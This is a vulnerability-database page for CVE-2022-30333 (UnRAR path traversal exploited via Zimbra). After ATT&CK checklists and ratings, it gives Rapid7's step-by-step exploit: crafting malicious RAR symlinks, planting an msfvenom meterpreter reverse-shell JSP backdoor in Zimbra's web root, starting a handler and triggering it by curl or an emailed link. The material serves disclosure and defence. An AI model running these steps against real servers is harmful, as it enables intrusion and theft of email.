Command and Scripting Interpreter: Windows Command Shell

Command and Scripting Interpreter: Unix Shell

Command and Scripting Interpreter: Visual Basic

Command and Scripting Interpreter: Python

Command and Scripting Interpreter: JavaScript/JScript

Software Deployment Tools

Native API

Shared Modules

Exploitation for Client Execution

User Execution

User Execution: Malicious Link

User Execution: Malicious File

Inter-Process Communication

Inter-Process Communication: Component Object Model

Inter-Process Communication: Dynamic Data Exchange

System Services

System Services: Launchctl

System Services: Service Execution

##### Exfiltration

Select any Techniques used:

Exfiltration Over Other Network Medium

Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth

Automated Exfiltration

Scheduled Transfer

Data Transfer Size Limits

Exfiltration Over C2 Channel

Exfiltration Over Alternative Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

Exfiltration Over Physical Medium

Exfiltration Over Physical Medium: Exfiltration over USB

Transfer Data to Cloud Account

Exfiltration Over Web Service

Exfiltration Over Web Service: Exfiltration to Code Repository

Exfiltration Over Web Service: Exfiltration to Cloud Storage

##### Impact

Select any Techniques used:

Data Destruction

Data Encrypted for Impact

Service Stop

Inhibit System Recovery

Defacement

Defacement: Internal Defacement

Defacement: External Defacement

Firmware Corruption

Resource Hijacking

Network Denial of Service

Network Denial of Service: Direct Network Flood

Network Denial of Service: Reflection Amplification

Endpoint Denial of Service

Endpoint Denial of Service: OS Exhaustion Flood

Endpoint Denial of Service: Service Exhaustion Flood

Endpoint Denial of Service: Application Exhaustion Flood

Endpoint Denial of Service: Application or System Exploitation

System Shutdown/Reboot

Account Access Removal

Disk Wipe

Disk Wipe: Disk Content Wipe

Disk Wipe: Disk Structure Wipe

Data Manipulation

Data Manipulation: Stored Data Manipulation

Data Manipulation: Transmitted Data Manipulation

Data Manipulation: Runtime Data Manipulation

##### Initial Access

Select any Techniques used:

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Replication Through Removable Media

External Remote Services

Drive-by Compromise

Exploit Public-Facing Application

Supply Chain Compromise

Supply Chain Compromise: Compromise Software Dependencies and Development Tools

Supply Chain Compromise: Compromise Software Supply Chain

Supply Chain Compromise: Compromise Hardware Supply Chain

Trusted Relationship

Hardware Additions

Phishing

Phishing: Spearphishing Attachment

Phishing: Spearphishing Link

Phishing: Spearphishing via Service

##### Lateral Movement

Select any Techniques used:

Remote Services

Remote Services: Remote Desktop Protocol

Remote Services: SMB/Windows Admin Shares

Remote Services: Distributed Component Object Model

Remote Services: SSH

Remote Services: VNC

Remote Services: Windows Remote Management

Software Deployment Tools

Taint Shared Content

Replication Through Removable Media

Exploitation of Remote Services

Internal Spearphishing

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Remote Service Session Hijacking

Remote Service Session Hijacking: SSH Hijacking

Remote Service Session Hijacking: RDP Hijacking

Lateral Tool Transfer

##### Persistence

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Account Manipulation

Account Manipulation: Additional Azure Service Principal Credentials

Account Manipulation: Exchange Email Delegate Permissions

Account Manipulation: Add Office 365 Global Administrator Role

Account Manipulation: SSH Authorized Keys

External Remote Services

Create Account

Create Account: Local Account

Create Account: Domain Account

Create Account: Cloud Account

Office Application Startup

Office Application Startup: Office Template Macros

Office Application Startup: Office Test

Office Application Startup: Outlook Forms

Office Application Startup: Outlook Home Page

Office Application Startup: Outlook Rules

Office Application Startup: Add-ins

Browser Extensions

BITS Jobs

Traffic Signaling

Traffic Signaling: Port Knocking

Server Software Component

Server Software Component: SQL Stored Procedures

Server Software Component: Transport Agent

Server Software Component: Web Shell

Implant Container Image

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Compromise Client Software Binary

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

##### Privilege Escalation

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Exploitation for Privilege Escalation

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Group Policy Modification

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Submit

Metasploit Module

[exploit/linux/fileformat/unrar\_cve\_2022\_30333](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/fileformat/unrar_cve_2022_30333.rb "exploit/linux/fileformat/unrar_cve_2022_30333")
[exploit/linux/http/zimbra\_unrar\_cve\_2022\_30333](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_unrar_cve_2022_30333.rb "exploit/linux/http/zimbra_unrar_cve_2022_30333")

[CISA KEV Listed](/search?q=cisa_kev_listed&qt=tag)[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)[Vulnerable in default configuration](/search?q=default_configuration&qt=tag)[Difficult to weaponize](/search?q=difficult_to_develop&qt=tag)

### Topic Tags

Select the tags that apply to this CVE (Assessment added tags are disabled and cannot be removed)

What makes this of high-value to an attacker?

Vulnerable in default configuration

Unauthenticated

Observed in state-sponsored attacks

Observed in ransomware attacks

Gives privileged access

Easy to weaponize

Difficult to patch

Common in enterprise

CISA KEV Listed

What makes this of low-value to an attacker?

Vulnerable in uncommon configuration

Requires user interaction

Requires physical access

Requires elevated access

No useful access

Difficult to weaponize

Authenticated

Submit

## Description

RARLAB UnRAR before 6.12 on Linux and UNIX allows directory traversal to write to files during an extract (aka unpack) operation, as demonstrated by creating a ~/.ssh/authorized\_keys file. NOTE: WinRAR and Android RAR are unaffected.

[See More
See Less](#description)

* [Ratings & Analysis](#ratings-analysis)
* [Vulnerability Details](#vuln-details)
* [![Rapid7](/static/public/img/rapid7-logo-light.svg)
  ![Rapid7](/static/public/img/rapid7-logo-dark.svg)
  Analysis](#rapid7-analysis)

## Add Assessment

[Log in to add an Assessment](/login)

3

[![](https://avatars.githubusercontent.com/u/104588115?v=4&s=50)](/contributors/rbowes-r7)

**[rbowes-r7 (95)](/contributors/rbowes-r7)**
![](/static/public/img/Badges-20-assessments.svg)

[July 18, 2022 4:55pm UTC (2 years ago)](/assessments/fcb1c463-4758-4944-a2e7-0a370b567d0a)•Edited 2 years ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Medium
[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)[Vulnerable in default configuration](/search?q=default_configuration&qt=tag)[Difficult to weaponize](/search?q=difficult_to_develop&qt=tag)
###### Technical Analysis

While we focused on Zimbra in our analysis, there are almost certainly other targets for this vulnerability that we are not aware of yet.

Exploiting this against Zimbra is really bad – it can be done fairly quietly and it doesn’t require direct access to the server, and can easily lead to root access to the server hosting users’ email. This is super urgent to patch on Zimbra!

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/fcb1c463-4758-4944-a2e7-0a370b567d0a)
[Delete Assessment and Exploited in the Wild Report](/assessments/fcb1c463-4758-4944-a2e7-0a370b567d0a)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-fcb1c463-4758-4944-a2e7-0a370b567d0a)

##### CVSS V3 Severity and Metrics

Data provided by the [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
Base Score:

7.5 High

Impact Score:

3.6

Exploitability Score:

3.9

Vector:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

Attack Vector (AV):

Network

Attack Complexity (AC):

Low

Privileges Required (PR):

None

User Interaction (UI):

None

Scope (S):

Unchanged

Confidentiality (C):

None

Integrity (I):

High

Availability (A):

None

### General Information

Offensive Application
Unknown
Utility Class
Unknown
Ports

Unknown

OS

Unknown

Vulnerable Versions
n/a
Prerequisites

Unknown

Discovered By

Unknown

PoC Author

Unknown

Metasploit Module

Unknown

Reporter

Unknown

### Vendors

* debian,
* rarlab

### Products

* debian linux 10.0,
* unrar

### Metasploit Modules

[exploit/linux/fileformat/unrar\_cve\_2022\_30333 (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/fileformat/unrar\_cve\_2022\_30333.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/fileformat/unrar_cve_2022_30333.rb)
[exploit/linux/http/zimbra\_unrar\_cve\_2022\_30333 (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra\_unrar\_cve\_2022\_30333.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_unrar_cve_2022_30333.rb)

### Exploited in the Wild

Reported by:
![](https://avatars.githubusercontent.com/u/63261883?v=4&s=50)

[gwillcox-r7](/contributors/gwillcox-r7)
 indicated source as
 Government or Industry Alert  [(https://www.cisa.gov/known-exploited-vulnerabilities-catalog)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

[Reported: August 11, 2022 3:05pm UTC (2 years ago)](#exploited-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677)

![](https://avatars.githubusercontent.com/u/40408740?v=4&s=50)

[ccondon-r7](/contributors/ccondon-r7)
 indicated source as
 Other:  Rapid7 has received reliable private reports of widespread exploitation in the wild

[Reported: August 16, 2022 8:26pm UTC (2 years ago)](#exploited-in-the-wild_9c3c0bdd-7a98-48de-a889-f351a2aec7cf)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_9c3c0bdd-7a98-48de-a889-f351a2aec7cf)

![](/static/public/img/akb-worker-avatar.png)

AttackerKB Worker indicated source as
 Government or Industry Alert  [(https://www.cisa.gov/news-events/alerts/2022/08/09/cisa-adds-two-known-exploited-vulnerabilities-catalog)](https://www.cisa.gov/news-events/alerts/2022/08/09/cisa-adds-two-known-exploited-vulnerabilities-catalog)

[Reported: November 08, 2024 8:33am UTC (2 months ago)](#exploited-in-the-wild_31e66e4c-4930-4bfd-9bb2-e48a795fa885)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_31e66e4c-4930-4bfd-9bb2-e48a795fa885)

### References

##### Canonical

[CVE-2022-30333 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30333)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30333)
##### Advisory

<https://www.rarlab.com/rar/rarlinux-x32-612.tar.gz>[[debian-lts-announce] 20230817 [SECURITY] [DLA 3534-1] rar security update (https://lists.debian.org/debian-lts-announce/2023/08/msg00022.html)](https://lists.debian.org/debian-lts-announce/2023/08/msg00022.html)[GLSA-202309-04 (https://security.gentoo.org/glsa/202309-04)](https://security.gentoo.org/glsa/202309-04)
##### Exploit

PoCs that have not been added by contributors directly have been sourced from:
[nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub).

A PoC added here by the AKB Worker must have at least 2 GitHub stars.

[Zimbra-CVE-2022-30333 (https://github.com/aslitsecurity/Zimbra-CVE-2022-30333)](https://github.com/aslitsecurity/Zimbra-CVE-2022-30333) (Added by AKB Worker)
##### Miscellaneous

<https://www.rarlab.com/rar_add.htm><https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/><http://packetstormsecurity.com/files/167989/Zimbra-UnRAR-Path-Traversal.html>

### Additional Info

Authenticated

Unknown
Exploitable

Unknown
Reliability

Unknown
Stability

Unknown
Available Mitigations

Unknown
Shelf Life

Unknown
Userbase/Installbase

Unknown
Patch Effectiveness

Unknown

![](/static/public/img/rapid7-avatar.svg)

Rapid7
[July 18, 2022 4:37pm UTC (2 years ago)](/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis)•
Last updated July 19, 2022 9:10pm UTC (2 years ago)

###### Technical Analysis

## Description

On May 6, 2022, Rarlab released [version 6.12](https://rarlab.com) ([open source version 6.1.7](https://github.com/pmachapman/unrar/commit/22b52431a0581ab5d687747b65662f825ec03946)), which addresses [CVE-2022-30333](https://nvd.nist.gov/vuln/detail/CVE-2022-30333), a path traversal vulnerability reported to them by [Sonar](https://www.sonarsource.com/), who posted [a write-up about it](https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/). Sonar specifically calls out [Zimbra Collaboration Suite’s](https://www.zimbra.com/) usage of `unrar` as vulnerable (specifically, the `amavisd` component, which is used to inspect incoming emails for spam and malware). Zimbra [addressed this issue](https://github.com/Zimbra/zm-amavis/commit/94308d6e1192495fd1cd2ccbd8d85aef5eff8084) in [9.0.0 patch 25](https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P25) and [8.5.15 patch 32](https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P32) by replacing `unrar` with `7z`.

An attacker who successfully exploits this vulnerability can write a file anywhere on the target file system as the user that executes `unrar` (on Zimbra, that’s the `zimbra` user). On Zimbra, we successfully exploited this vulnerability for remote code execution. Note that the server doesn’t necessarily need to be internet-facing to be exploited, it simply needs to receive a malicious email.

While other services likely use vulnerable versions of `unrar` and should be patched, Zimbra is an especially good target because, as we’ll discuss below, a vulnerable host can be exploited by simply receiving an email (no user interaction). Additionally, Zimbra is [quite popular](https://www.shodan.io/search?query=%22Set-Cookie%3A+ZM_LOGIN_CSRF%3D%22+%22200+OK%22) (as of this writing, there are approximately 62,000 Internet-facing hosts from a quick Shodan query). And finally, an attacker who successfully gains access as the `zimbra` account can read all of an organization’s email.

## Affected software

UnRAR 6.17 and earlier are affected, which is used by:

* Zimbra 9.0.0 patch 24 and earlier
* Zimbra 8.8.15 patch 31 and earlier
* Possibly older versions

Because this is exploitable against Zimbra by only sending an email, and because Zimbra tends to be a goldmine of valuable data in most organizations that use it, Rapid7 believes that patching this vulnerability is critical, and that exploitation is very likely to occur.

## Technical analysis

According to [Sonar’s writeup](https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/), the core issue in CVE-2022-30333 is with how `unrar` handles symbolic links. Specifically, it validates that Linux symbolic links don’t contain path traversal characters using forward-slash characters (`../`), then converts Windows symbolic links (with backslash characters) to Linux. That is, it performs security checks before converting data. As a result, a malicious Windows symbolic link can bypass Linux’s protections and point to anywhere on the Linux filesystem. Let’s look at what that means!

### Building a malicious .rar File

To generate a malicious .rar file, we use any version of WinRAR (on Windows) to compress a Windows symbolic link:

```
C:\Users\ron>mklink testlink "..\..\..\..\..\..\..\..\etc\passwd"
symbolic link created for testlink <<===>> ..\..\..\..\..\..\..\..\etc\passwd
C:\Users\ron>"c:\Program Files\WinRAR\Rar.exe" a -ol test.rar testlink
RAR 6.11 x64   Copyright (c) 1993-2022 Alexander Roshal   3 Mar 2022
[...]
Adding    testlink                                                    OK
Done

```

Then we copy the .rar file we created to a Linux host with a vulnerable version of `unrar`, and inspect it:

```
$ strings test.rar
Rar!
testlink
"../../../../../../../../etc/passwd

```

Even though it’s Windows, WinRAR encodes forward slashes, so we change them to backslashes with `sed`:

```
$ sed 's|\.\./|..\\|g' < test.rar > test-fixed.rar
$ strings test-fixed.rar
Rar!
testlink
"..\..\..\..\..\..\..\..\etc/passwd

```

Then `unrar` on Linux with a vulnerable version:

```
$ ../rar/unrar x ./test-fixed.rar
UNRAR 6.11 freeware      Copyright (c) 1993-2022 Alexander Roshal
[...]
Extracting from ./test-fixed.rar
Corrupt header is found
testlink - the file header is corrupt
Extracting  testlink                                                  OK
Total errors: 4
$ ls -l
total 2
-rw-r--r--. 1 ron games 110 Jul 15 10:06 test-fixed.rar
lrwxrwxrwx. 1 ron games  34 Jul 15 10:07 testlink -> ../../../../../../../../etc/passwd
-rwxrwxrwx. 1 ron games 110 Jul 15 10:02 test.rar
$ head -n1 testlink
root:x:0:0:root:/root:/bin/bash

```

Even though it prints errors, it still successfully extracts the link, and the link does indeed point outside the directory structure! We could fix those errors by recalculating the .rar file’s checksums, but since `unrar` doesn’t seem to mind the errors, this will work fine. The .rar implementation is also non-free, so distributing code to recalculate checksums might be problematic.

So that’s how to create a malicious symbolic link. But in the introduction to this article, we mentioned writing a file to the filesystem. How’s that work?

### Writing a file to the filesystem

For the next part of our exploit, let’s look at how to write an arbitrary file to the filesystem!

First, we create and compress the symbolic link exactly like before, except this time we point it to a place where our user account can write to:

```
C:\Users\ron\Desktop>mklink testlink "..\..\..\..\..\..\..\..\tmp\akbdemo.txt"
symbolic link created for testlink <<===>> ..\..\..\..\..\..\..\..\tmp\akbdemo.txt
C:\Users\ron\Desktop>"c:\Program Files\WinRAR\Rar.exe" a -ol test.rar testlink
[...]

```

Then we create a second file, whose filename is the same length as the link but whose filename is different, then add that to the archive:

```
C:\Users\ron\Desktop>echo Hello, Internet! > evillink
C:\Users\ron\Desktop>"c:\Program Files\WinRAR\Rar.exe" a -ol test.rar evillink
[...]

```

We can inspect the archive to make sure we did it correctly:

```

C:\Users\ron\Desktop>"c:\Program Files\WinRAR\Rar.exe" v test.rar
RAR 6.11 x64   Copyright (c) 1993-2022 Alexander Roshal   3 Mar 2022
Trial version             Type 'rar -?' for help
Archive: test.rar
Details: RAR 5
 Attributes      Size    Packed Ratio    Date    Time   Checksum  Name
----------- ---------  -------- ----- ---------- -----  --------  ----
    ..A....         0         0   0%  2022-07-15 10:16  00000000  testlink
    ..A....        19        19 100%  2022-07-15 10:19  F5466516  evillink
----------- ---------  -------- ----- ---------- -----  --------  ----
                   19        19 100%                              2

```

Then, just like last time, we copy it over to Linux and fix the slashes. But this time, we also change the filename `evillink` to `testlink` in the archive. Our goal is to create a symlink called `testlink` by extracting the first file, then write to the symlink when we extract the second file. That means we need to store two files with the same name, which `rar` doesn’t let us do (if we try, the second file overwrites the first).

Here are the `sed` commands we used to reverse the slashes, change the filename, and then validate the files:

```
$ sed -e 's|\.\./|..\\|g' -e 's|evillink|testlink|' < test.rar > test-fixed.rar
$ strings test-fixed.rar
Rar!
testlink
'..\..\..\..\..\..\..\..\tmp/akbdemo.txt4@
testlink
Hello, Internet!

```

Then we extract our malicious .rar file with a vulnerable version of `unrar` and confirm that it writes to `/tmp/akbdemo.txt`:

```
$ ../rar/unrar x test-fixed.rar
UNRAR 6.11 freeware      Copyright (c) 1993-2022 Alexander Roshal
[...]
Extracting  testlink                                                  OK
Corrupt header is found
testlink - the file header is corrupt
Extracting  testlink                                                  OK
Total errors: 6
$ ls -l
total 2
-rw-rw-r--. 1 ron games 175 Jul 15 10:23 test-fixed.rar
lrwxrwxrwx. 1 ron games  39 Jul 15 10:24 testlink -> ../../../../../../../../tmp/akbdemo.txt
-rwxrwxrwx. 1 ron games 175 Jul 15 10:20 test.rar
$ cat /tmp/akbdemo.txt
Hello, Internet!

```

And with that, we wrote an arbitrary file to an arbitrary location on the filesystem! But didn’t we mention that we could exploit Zimbra earlier?

### Exploiting Zimbra

Zimbra is an all-in-one email solution that automatically configures a tool called [Amavis](https://en.wikipedia.org/wiki/Amavis) to check incoming email messages for spam and (ironically) malware. Amavis is very configurable, but prior to patching, it used `unrar` to inspect .rar files:

```
ron@zimbra:~$ sudo cat /opt/zimbra/conf/amavisd.conf | grep \'rar\'
  ['rar',  \&do_unrar, ['unrar', 'rar'] ],
  ['exe',  \&do_executable, ['unrar','rar'], 'lha', ['unarj','arj'] ],

```

As of the most recent Zimbra patches, Amavis uses `7z` instead.

Knowing that attached files will be UnRARed using `unrar`, we emailed the malicious .rar file we already built to any user on the server (we don’t have a real Zimbra system set up, so we emailed from one user on the server to another). Then we checked the `/tmp` folder on Zimbra, and, just like in our local tests, `/tmp/akbdemo.txt` is indeed created and owned by `zimbra`:

```
ron@zimbra:~$ ls -l /tmp/akbdemo.txt
-rw-r----- 1 zimbra zimbra 19 Jul 15 17:19 /tmp/akbdemo.txt
ron@zimbra:~$ sudo cat /tmp/akbdemo.txt
Hello, Internet!

```

The Amavis logs show the same `unrar` errors we saw earlier:

```
ron@zimbra:~$ sudo journalctl -t amavis | tail -n14
Jul 15 17:33:46 zimbra.example.org amavis[103991]: (103991-01) Checking: 9CcP4Rib32w2 ORIGINATING/MYNETS [10.0.0.154] <ron@zimbra.example.org> -> <admin@zimbra.example.org>
Jul 15 17:33:46 zimbra.example.org amavis[103991]: (103991-01) (!)do_unrar: can't parse info line for "" Corrupt header is found\n
Jul 15 17:33:46 zimbra.example.org amavis[103991]: (103991-01) (!)do_unrar: can't parse info line for "" testlink - the file header is corrupt\n
Jul 15 17:33:46 zimbra.example.org amavis[103991]: (103991-01) 5x162D0R55bZ(9CcP4Rib32w2) SEND from <admin@zimbra.example.org> -> <admin@zimbra.example.org>, ENVID=AM.5x162D0R55bZ.20220715T173346Z@zimbra.example.org 250 2.0.0 from MTA(smtp:[127.0.0.1]:10025): 250 2.0.0 Ok: queued as 754D8C11CB

```

Weaponizing this vulnerability is still somewhat difficult – we cannot overwrite a file, and the number of locations that the `zimbra` user can write is actually fairly limited. That being said, we did successfully weaponize it using a Metasploit payload. Let’s see how!

### Weaponizing the payload

Now that we can write the file to the filesystem, we needed to find a way to plant a backdoor. Each exploit for this vulnerability will vary, but we will focus on a Zimbra installation in its default location.

The number of locations where we can write to Zimbra’s directory structure is limited, but we can enumerate them all with `find` command:

```
$ sudo -u zimbra find /opt/zimbra/ -type d -writable
/opt/zimbra/log
/opt/zimbra/logger
/opt/zimbra/logger/db
/opt/zimbra/logger/db/data
/opt/zimbra/logger/db/data/rrds
/opt/zimbra/logger/db/work
/opt/zimbra/docs
[...]

```

We tried to find places where we could write shellscripts, such as `/etc/profile.d` and other similar locations, but could not find one that is writable. We looked for Zimbra shellscripts that `source` other files, but no luck there, either. We looked at overwriting `/opt/zimbra/.bashrc`, but it turns out that this exploit cannot overwrite a file because of how `unrar` is called.

Fortunately (for exploit development), we determined that Zimbra’s web root is writable by the Zimbra user (`/opt/zimbra/jetty_base/webapps/...`), so we chose that as a target.

To create a payload, we use `msfvenom` and name the output file `evillink` (to match our earlier examples):

```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.146 -f jsp -o evillink

```

Then, on Windows, we create a symbolic link to where we want to drop the backdoor (the public server), along with our payload (be sure to compress the link before the backdoor, since we need to create the link before writing to it):

```
C:\Users\ron\Desktop>mklink testlink "..\..\..\..\..\..\..\..\..\..\..\..\opt\zimbra\jetty_base\webapps\zimbra\public\backdoor.jsp"
symbolic link created for testlink <<===>> ..\..\..\..\..\..\..\..\..\..\..\..\opt\zimbra\jetty_base\webapps\zimbra\public\backdoor.jsp
C:\Users\ron\Desktop>"c:\Program Files\WinRAR\Rar.exe" a -ol test.rar testlink evillink
[...]

```

Then, back on Linux, we fix the file exactly like last time and email it to any account on the Zimbra server:

```
$ sed -e 's|\.\./|..\\|g' -e 's|evillink|testlink|' < test.rar > test-fixed.rar
<send test-fixed.rar as an email attachment>

```

Once it’s emailed, we can verify that the vulnerability successfully triggered and extracted the backdoor:

```
ron@zimbra:~$ ls -l /opt/zimbra/jetty_base/webapps/zimbra/public/backdoor.jsp
-rw-r----- 1 zimbra zimbra 1922 Jul 15 17:48 /opt/zimbra/jetty_base/webapps/zimbra/public/backdoor.jsp

```

Using `msfconsole`, we can fire up our handler:

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST 10.0.0.146
LHOST => 10.0.0.146
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.0.0.146:4444

```

Then trigger the backdoor with `curl`:

```
$ curl -k 'https://10.0.0.154/public/backdoor.jsp'

```

Alternatively, if the server is intranet-only, send an email to any user on the server containing a link to the backdoor (this will inevitably require user interaction, unless the server globally allows images to be displayed):

```
<img src="https://10.0.0.154/public/backdoor">
-or-
<a href="https://10.0.0.154/public/backdoor">Click me!</a>
-or-
<a href="https://some-open-redictor/?url=https://10.0.0.154/public/backdoor">Click me!</a>

